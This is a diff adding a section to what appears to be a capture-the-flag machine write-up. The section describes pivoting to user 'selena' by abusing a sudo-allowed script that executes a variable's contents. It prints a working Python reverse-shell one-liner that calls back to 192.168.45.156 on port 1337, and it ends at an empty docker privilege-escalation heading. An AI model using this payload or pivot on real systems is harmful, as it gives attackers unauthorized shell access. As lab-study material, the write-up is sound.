@@ -127,6 +127,33 @@
 ![image](https://github.com/user-attachments/assets/b3dab1fb-5643-4fa1-bd01-a7379f900004)
 
 
+### Pivoting to user `selena`
+
+- I ran `sudo -l` which shows that we can run a shell script as user `selena`.
+
+![image](https://github.com/user-attachments/assets/980768fc-a372-470a-aeaa-d7078bb3a4e2)
+
+- I checked the shell script and discovered that we can execute shell commands with string stored in variable `msg` which is executed when it gets to statement `$msg 2</dev/null`.
+
+![image](https://github.com/user-attachments/assets/7252a0b1-5147-4aec-bf9c-0a4f5bc8879e)
+
+- I created a bash script in directory `tmp` and added a rev bash shell code to it.I applied this method to call the script later in `messenger.sh`.
+
+   PAYLOAD-:```echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.156\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'" > /tmp/script;chmod +x /tmp/script```
+
+![image](https://github.com/user-attachments/assets/406269d1-bafa-46d1-bc63-c33bf8ce5dea)
+
+- Shell as selena
+
+![image](https://github.com/user-attachments/assets/f48f53ba-84d3-4e79-ac31-b534ce1e51b1)
+
+### Privesc with group `docker`
+
+-
+
+
+
+
 
 
 
